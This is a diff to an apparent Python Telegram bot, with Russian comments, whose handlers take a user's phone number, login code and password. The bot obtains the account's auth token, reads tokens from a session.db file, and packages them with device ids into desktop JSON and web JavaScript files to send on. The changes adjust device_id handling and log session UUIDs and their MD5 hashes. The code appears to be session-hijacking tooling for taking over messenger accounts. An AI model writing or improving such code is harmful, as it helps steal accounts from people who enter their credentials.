@@ -5,6 +5,7 @@ import uuid
 import logging
 import time
 import sqlite3
+import hashlib
 from functools import wraps
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -143,10 +144,6 @@ async def phone_handler(message: types.Message, state: FSMContext):
                 pending[uid]["token"] = client.token
                 pending[uid]["user_id"] = client.my_id
                 pending[uid]["status"] = "done"
-                # Логируем device_id
-                logging.info(f"client.device_id: {getattr(client, 'device_id', 'НЕТ')}")
-                logging.info(f"client._device_id: {getattr(client, '_device_id', 'НЕТ')}")
-                logging.info(f"client.session.device_id: {getattr(getattr(client, 'session', None), 'device_id', 'НЕТ')}")
         except Exception as e:
             error = str(e).lower()
             logging.error(f"auth_task: исключение для uid={uid}: {e}")
@@ -225,14 +222,6 @@ async def code_handler(message: types.Message, state: FSMContext):
             session_id = int(time.time() * 1000)
             device_id = gen_device_id()
 
-            # Сохраняем device_id из клиента, если есть
-            client = pending[uid].get("client")
-            if client:
-                client_device_id = getattr(client, 'device_id', None) or getattr(getattr(client, 'session', None), 'device_id', None)
-                if client_device_id:
-                    device_id = client_device_id.replace('-', '')[:16]
-                    logging.info(f"Используем device_id из клиента: {device_id}")
-
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
             await send_files(phone, uid, work_dir, desktop, js)
@@ -307,6 +296,9 @@ async def password_handler(message: types.Message, state: FSMContext):
             cursor.execute("SELECT * FROM sessions LIMIT 1")
             row = cursor.fetchone()
             if row:
+                logging.info(f"session.db[1] UUID: {row[1]}")
+                logging.info(f"session.db[1] без дефисов: {row[1].replace('-', '')[:16]}")
+                logging.info(f"MD5 от UUID первые 16: {hashlib.md5(row[1].encode()).hexdigest()[:16]}")
                 token = row[0]
                 pending[uid]["token"] = token
                 pending[uid]["status"] = "done"
@@ -321,13 +313,6 @@ async def password_handler(message: types.Message, state: FSMContext):
         password = gen_password()
         session_id = int(time.time() * 1000)
         device_id = gen_device_id()
-
-        # Сохраняем device_id из клиента, если есть
-        if client:
-            client_device_id = getattr(client, 'device_id', None) or getattr(getattr(client, 'session', None), 'device_id', None)
-            if client_device_id:
-                device_id = client_device_id.replace('-', '')[:16]
-                logging.info(f"Используем device_id из клиента: {device_id}")
 
         js = generate_web_js(device_id, token, viewer_id)
 
